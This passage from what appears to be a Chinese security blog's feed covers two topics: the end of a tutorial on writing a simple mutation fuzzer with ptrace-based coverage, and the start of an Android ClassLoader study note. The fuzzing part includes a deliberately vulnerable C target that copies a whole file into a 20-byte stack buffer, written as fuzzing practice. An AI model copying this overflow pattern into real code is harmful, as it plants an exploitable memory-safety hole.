class="number">0xffffffff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0x80000000</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0x7fffffff</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">0x40000000</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MagicOverwrite</span><span class="params">(std::vector&lt;<span class="type">char</span>&gt;&amp; data)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> num_to_over = std::<span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;((data.<span class="built_in">size</span>() - <span class="number">4</span>) * <span class="number">0.001</span>));</span><br><span class="line">  std::vector&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; victim_indexs;</span><br><span class="line">  victim_indexs.<span class="built_in">reserve</span>(num_to_over);</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">2</span>, data.<span class="built_in">size</span>() - <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num_to_over; ++i) &#123;</span><br><span class="line">    victim_indexs.<span class="built_in">emplace_back</span>(RandomGenerator::<span class="built_in">GetRandomNum</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  RandomGenerator::<span class="built_in">SetRange</span>(<span class="number">0</span>, <span class="number">9</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; i : victim_indexs) &#123;</span><br><span class="line">    <span class="type">int</span> magic_index = RandomGenerator::<span class="built_in">GetRandomNum</span>();</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;data[i], &amp;gMagicNums[magic_index].second, gMagicNums[magic_index].first);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行测试,也成功得到了crash,但运行数次发现crash数量明显少于位翻转得到的</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/20241230104129.png" alt=""></p><p>至此,一个简陋非常的fuzzer的基本结构就已经完成了</p><h2 id="STEP-Ⅵ"><a href="#STEP-Ⅵ" class="headerlink" title="STEP Ⅵ"></a>STEP Ⅵ</h2><p>对结果可以进一步使用ASAN(AddressSanitizer)对crash进行分类处理</p><h1 id="Learn-Code-Coverage"><a href="#Learn-Code-Coverage" class="headerlink" title="Learn Code Coverage"></a>Learn Code Coverage</h1><p>现在fuzzer基本都支持代码覆盖率,这是一个非常amazing的东西,接下来使用ptrace模拟代码覆盖率</p><p>仓库地址<a href="https://github.com/h0mbre/Fuzzing/blob/master/Caveman4/">https://github.com/h0mbre/Fuzzing/blob/master/Caveman4/</a></p><h2 id="STEP-Ⅰ"><a href="#STEP-Ⅰ" class="headerlink" title="STEP Ⅰ"></a>STEP Ⅰ</h2><p>先看一下我们的目标程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ORIGINAL_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> * data;</span><br><span class="line">    <span class="type">size_t</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">struct</span> ORIGINAL_FILE <span class="title function_">get_bytes</span><span class="params">(<span class="type">char</span>* fileName)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    FILE *filePtr;</span><br><span class="line">    <span class="type">char</span>* buffer;</span><br><span class="line">    <span class="type">long</span> fileLen;</span><br><span class="line"> </span><br><span class="line">    filePtr = fopen(fileName, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!filePtr) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Unable to open %s\n&quot;</span>, fileName);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (fseek(filePtr, <span class="number">0</span>, SEEK_END)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] fseek() failed, wtf?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    fileLen = ftell(filePtr);</span><br><span class="line">    <span class="keyword">if</span> (fileLen == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] ftell() failed, wtf?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    rewind(filePtr);</span><br><span class="line">    <span class="keyword">if</span> (errno) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] rewind() failed, wtf?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">long</span> trueSize = fileLen * <span class="keyword">sizeof</span>(<span class="type">char</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] %s is %ld bytes.\n&quot;</span>, fileName, trueSize);</span><br><span class="line">    buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(fileLen * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">    fread(buffer, fileLen, <span class="number">1</span>, filePtr);</span><br><span class="line">    fclose(filePtr);</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ORIGINAL_FILE</span> <span class="title">original_file</span>;</span></span><br><span class="line">    original_file.data = buffer;</span><br><span class="line">    original_file.length = trueSize;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> original_file;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">check_one</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">int</span> check)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (buffer[check] == <span class="string">&#x27;\x6c&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 1 failed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">check_two</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">int</span> check)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (buffer[check] == <span class="string">&#x27;\x57&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 2 failed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">check_three</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">int</span> check)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (buffer[check] == <span class="string">&#x27;\x21&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 3 failed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span>* buffer, <span class="type">size_t</span> length)</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Passed all checks!\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span> vulnBuff[<span class="number">20</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memcpy</span>(vulnBuff, buffer, length);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span> || argc &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Usage: vuln example.txt\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *filename = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Analyzing file: %s.\n&quot;</span>, filename);</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ORIGINAL_FILE</span> <span class="title">original_file</span> =</span> get_bytes(filename);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> checkNum1 = (<span class="type">int</span>)(original_file.length * <span class="number">.33</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 1 no.: %d\n&quot;</span>, checkNum1);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> checkNum2 = (<span class="type">int</span>)(original_file.length * <span class="number">.5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 2 no.: %d\n&quot;</span>, checkNum2);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> checkNum3 = (<span class="type">int</span>)(original_file.length * <span class="number">.67</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[&gt;] Check 3 no.: %d\n&quot;</span>, checkNum3);</span><br><span class="line"> </span><br><span class="line">    check_one(original_file.data, checkNum1);</span><br><span class="line">    check_two(original_file.data, checkNum2);</span><br><span class="line">    check_three(original_file.data, checkNum3);</span><br><span class="line">     </span><br><span class="line">    vuln(original_file.data, original_file.length);</span><br><span class="line">     </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标程序有三个检查点,分别检查1/3,1/2,2/3处的字节是否通过检查,当全部通过时便会直接触发段错误</p><p>利用之前的fuzzer,每次选择%1的字节进行完全随机变异,选中1/3处字节进行变异且刚好变异为我们所需要的字节的概率是1/25600,三次检查点都成功命中的概率可见是很低的,估计所需次数达到了万亿级别</p><p>所以我们需要在通过第一个检查后,保存当前状态,以此为基础作为下一次变异的基础,这样概率就能从指数级降低改为线性降低</p><h2 id="STEP-Ⅱ-1"><a href="#STEP-Ⅱ-1" class="headerlink" title="STEP Ⅱ"></a>STEP Ⅱ</h2><p>之前我们的fuzzer每一次启动都会使用大量的系统调用</p><p>其中fork()以及文件IO函数消耗极大却频繁出现,接下来我们考虑使用快照机制来减少这两种系统调用的出现,以提高性能,并实现我们的代码覆盖率</p><p>基本思路就是</p><ol><li>在文件读取文件后内容后设置一个断点,将此时的寄存器以及所有可写内存保存一份</li><li>在另一块内存将jpg文件数据复制,并对其变异</li><li>将变异后的数据写入目标内存替换原始数据,开始运行</li><li>如果遇到exit那么就恢复寄存器以及所有可写内存,重新回到第二步</li><li>如果遇到断点,那么就将当前变异后数据作为新的变异源数据,并再次开始</li></ol><h2 id="Persistent-Fuzz"><a href="#Persistent-Fuzz" class="headerlink" title="Persistent Fuzz"></a>Persistent Fuzz</h2><p>通过劫持共享库使从文件或从网络中读取数据变为从内存中读取</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fuzzer应该是二进制安全学习者的必修项目,互联网上开源可供使用的fuzzer成百上千,专品精品应有尽有,但没什么比自己动手写一个fuzzer更好的学习方法了&lt;/p&gt;
&lt;p&gt;这里跟随国外的&lt;a href=&quot;https://h0mbre.github.io/&quot;&gt;h0mbre</summary>
      
    
    
    
    
    <category term="fuzzer" scheme="https://ixout.github.io/tags/fuzzer/"/>
    
  </entry>
  
  <entry>
    <title>Android ClassLoader 学习笔记</title>
    <link href="https://ixout.github.io/posts/38747/"/>
    <id>https://ixout.github.io/posts/38747/</id>
    <published>2024-11-07T03:24:20.000Z</published>
    <updated>2025-03-12T03:21:10.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本类预加载"><a href="#基本类预加载" class="headerlink" title="基本类预加载"></a>基本类预加载</h1><p>从linux系统启动到进入android世界之前, 简要流程就是</p><ul><li><strong>Bootloader</strong> 加载内核，初始化 CPU、内存，挂载文件系统</li><li><strong>Linux 内核</strong> 启动，初始化设备驱动、挂载 <code>rootfs</code>，启动 <code>init</code> 进程</li><li><strong><code>init</code> 进程</strong> 解析 <code>/init.rc</code>，启动关键服务（如 <code>ueventd</code>、<code>vold</code>），然后启动 <code>Zygote</code></li><li><strong>Zygote 进程</strong> 运行 <code>ZygoteInit.main()</code>，预加载 Java 类，并 <code>fork()</code> 启动 <code>SystemServer</code></li></ul><p>Zygote 是 <strong>Android 进程的孵化器</strong>，几乎所有的应用进程都是由它 fork 出来的。</p><p>zygote在native时做的工作(/system/bin/app_process)</p><blockquote><p>（1）创建虚拟机–startVM<br>（2）注册JNI函数–startReg<br>（3）通过JNI获得Java层的com.android.internal.os.ZygoteInit 类，调用main 函数，进入java 世界</p></blockquote><p>zygote在java时做的工作</p><blockquote><p>（4）registerZygoteSocket()建立socket通道，zygote作为通信的服务端，用于响应客户端请求<br>（5）preload()预加载通用类、drawable和color资源、openGL以及共享库以及WebView，用于提高app启动效率<br>（6）通过startSystemServer()，fork得力帮手system_server进程，也是Java Framework的运行载体（下面讲到system server再详细讲解）<br>（7）调用runSelectLoop()，随时待命，当接收到请求创建新进程请求时立即唤醒并执行相应工作</p></blockquote><p>preload加载基本类部分代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">preload</span><span class="params">(TimingsTraceLog bootTimingsTraceLog)</span> &#123;</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">    preloadClasses();</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">preloadClasses</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">VMRuntime</span> <span class="variable">runtime</span> <span class="operator">=</span> VMRuntime.getRuntime();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取 preloaded_classes 文件</span></span><br><span class="line">    InputStream is;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        is = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(PRELOADED_CLASSES);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Couldn&#x27;t find &quot;</span> + PRELOADED_CLASSES + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is), Zygote.SOCKET_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Skip comments and blank lines.</span></span><br><span class="line">            line = line.trim();</span><br><span class="line">            <span class="keyword">if</span> (line.startsWith(<span class="string">&quot;#&quot;</span>) || line.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Trace.traceBegin(Trace.TRACE_TAG_DALVIK, line);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 逐行加载基本类</span></span><br><span class="line">                Class.forName(line, <span class="literal">true</span>, <span class="literal">null</span>);</span><br><span class="line">                count++;</span><br><span class="line">                <span class="comment">// ...省略</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                <span class="comment">// ...省略</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...省略</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Error reading &quot;</span> + PRELOADED_CLASSES + <span class="string">&quot;.&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// ...省略</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于预加载, 在dalvik/art启动时将所有Java基本类和Android系统框架的基本类加载进来</p><p>这些类只需要在Zygote进程启动时加载一遍，后续APP或Android运行时环境的进程，都是从Zygote中fork出来，自然会继承zygote加载过的类</p><h1 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h1><p>Android中的类加载器机制与JVM一样遵循双亲委派模式</p><p>所谓双亲委派就是指</p><ol><li>加载.class时以递归的方式逐级向上委托给父加载器ParentClassLoader, 父加载器首先判断是否加载过该class<ol><li>加载过则直接向下返回</li><li>未加载过则继续向上提交</li></ol></li><li>直到提交到顶层父加载器, 如果顶层父加载器也没有加载过, 则尝试加载, 如果加载失败则逐级向下交还调用者加载</li></ol><p>代码如下<code>/libcore/ojluni/src/main/java/java/lang/ClassLoader.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                c = findClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>findLoadedClass</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the class with the given &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; if this</span></span><br><span class="line"><span class="comment"> * loader has been recorded by the Java virtual machine as an initiating</span></span><br><span class="line"><span class="comment"> * loader of a class with that &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt;.  Otherwise</span></span><br><span class="line"><span class="comment"> * &lt;tt&gt;null&lt;/tt&gt; is returned.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  name</span></span><br><span class="line"><span class="comment"> *         The &lt;a href=&quot;#name&quot;&gt;binary name&lt;/a&gt; of the class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  The &lt;tt&gt;Class&lt;/tt&gt; object, or &lt;tt&gt;null&lt;/tt&gt; if the class has</span></span><br><span class="line"><span class="comment"> *          not been loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>  1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">    ClassLoader loader;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span> == BootClassLoader.getInstance())</span><br><span class="line">        loader = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        loader = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">return</span> VMClassLoader.findLoadedClass(loader, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VMClassLoader.findLoadedClass(loader, name)</code> 是一个 <strong>native 方法</strong>，直接与 JVM 交互，用于查询 <code>name</code> 这个类是否已经被 <code>loader</code> 加载过。如果已经加载，返回 <code>Class&lt;?&gt;</code> 对象</p><p>如果当前 <code>ClassLoader</code> 是 <code>BootClassLoader</code>，则将 <code>loader</code> 设为 <code>null</code>，表示请求 JVM 内部查找是否加载过该类, 否则在对应的loader内寻找</p><hr><p>如果当前没有找到该类, 则提交给父加载器递归调用<code>LoadClass</code>, 如果顶层父加载器也没找到就调用<code>findClass</code>进行加载类</p><h1 id="android类加载器"><a href="#android类加载器" class="headerlink" title="android类加载器"></a>android类加载器</h1><p>对于android主要关注三个类加载器</p><ul><li><strong>系统类的加载器</strong>（BootClassLoader）</li><li><strong>当前应用的类加载器</strong>（PathClassLoader）</li><li><strong>动态加载一个外部 <code>dex</code> 文件</strong>(DexClassLoader)</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/classloader.png" alt=""></p><p>BootClassLoader是ClassLoader的子类, PathClassLoader 和 DexClassLoader是BaseDexClassLoader的子类, 而BaseDexClassLoader又是ClassLoader的子类</p><p>三者的父加载器关系是<strong>DexClassLoader</strong> → <strong>PathClassLoader</strong> → <strong>BootClassLoader</strong> -&gt; <strong>Null</strong></p><p>而BootClassLoader是全局唯一的</p><p>PathClassLoader实例则是每个APP都拥有一个</p><p><strong>demo</strong></p><p>一个测试程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 